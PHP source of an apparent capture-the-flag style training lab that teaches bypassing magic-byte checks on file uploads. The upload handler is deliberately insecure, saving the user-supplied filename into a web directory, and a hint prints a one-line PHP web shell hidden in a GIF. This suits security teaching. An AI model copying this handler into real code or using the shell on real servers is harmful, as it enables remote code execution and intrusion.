<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/score_manager.php');
session_start();

$message = '';
$uploaded = false;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    // 1. فحص الامتداد (الظاهري)
    $filename = $_FILES['file']['name'];
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $allowed_ext = ['jpg', 'jpeg', 'png', 'gif'];
    
    if (!in_array($ext, $allowed_ext)) {
        $message = "Error: Only images allowed (jpg, png, gif)";
    } else {
        // 2. فحص محتوى الملف (الـ Magic Bytes) باستخدام finfo
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
        finfo_close($finfo);
        
        $allowed_mime = ['image/jpeg', 'image/png', 'image/gif'];
        
        if (!in_array($mime, $allowed_mime)) {
            $message = "Error: Invalid file content. Magic bytes don't match extension.";
        } else {
            // 3. التنفيذ لو كل شيء سليم
            $target_dir = 'uploads/';
            if (!file_exists($target_dir)) mkdir($target_dir, 0777, true);
            
            $target = $target_dir . $filename;
            if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
                $message = "Uploaded: " . htmlspecialchars($filename);
                $uploaded = true;

                // تسجيل النجاح وزيادة السكور (ID = 9)
                if (solveLab($pdo, 9)) {
                    echo "<script>alert('Elite Move! You bypassed Magic Bytes validation.');</script>";
                }
            }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Magic Bytes - File Upload Lab 5</title>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600;800&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" type="text/css" href="css/magic-bytes.css">
</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/navbar.php'; ?>

  <div class="container">
    <a href="index.php" class="back-link"><i class="fas fa-arrow-left"></i>Back</a>

    <div class="lab-header">
      <div class="difficulty-badge"><i class="fas fa-fire"></i>Medium</div>
      <h1 class="lab-title">Magic Bytes Validation</h1>
      <div class="lab-tags">
        <span class="tag">Magic Bytes</span>
        <span class="tag">File Signature</span>
        <span class="tag">finfo()</span>
        <span class="tag">Polyglot</span>
      </div>
      <p>Server checks file signatures (magic bytes) AND extension!</p>
    </div>

    <form method="POST" enctype="multipart/form-data">
      <div class="upload-area">
        <i class="fas fa-fingerprint upload-icon"></i>
        <h3>Upload Image</h3>
        <p>Both extension and file content are validated</p>
        <input type="file" name="file" id="file" accept=".jpg,.jpeg,.png,.gif" style="display: none;" required>
        <button type="button" class="upload-btn" onclick="document.getElementById('file').click()">Select Image</button>
        <br><br>
        <button type="submit" class="upload-btn" style="background: var(--neon-cyan); color: #000;">Upload</button>
      </div>
    </form>

    <?php if ($message): ?>
    <?php if ($uploaded): ?>
    <div class="success-msg"><i class="fas fa-check-circle"></i><?php echo $message; ?></div>
    <?php else: ?>
    <div class="error-msg"><i class="fas fa-exclamation-circle"></i><?php echo $message; ?></div>
    <?php endif; ?>
    <?php endif; ?>

    <div class="hint-box">
      <div class="hint-title"><i class="fas fa-lightbulb"></i>Hint</div>
      <p>Create a <strong>polyglot file</strong>: Image with PHP code embedded!</p>
      <div class="magic-bytes"
        style="background: rgba(0,0,0,0.5); padding: 10px; border-radius: 5px; font-family: monospace;">
        <div><strong>Common Magic Bytes:</strong></div>
        <div style="color: var(--neon-yellow);">JPEG: FF D8 FF</div>
        <div style="color: var(--neon-cyan);">PNG: 89 50 4E 47</div>
        <div style="color: var(--neon-green);">GIF: 47 49 46 38</div>
      </div>
      <p style="margin-top: 15px;">
        <strong>Technique:</strong><br>
        Add your code after the magic bytes or in the metadata (EXIF).<br>
        <code>echo 'GIF89a; <?php system($_GET["cmd"]); ?>' > shell.gif</code>
      </p>
    </div>
  </div>
</body>

</html>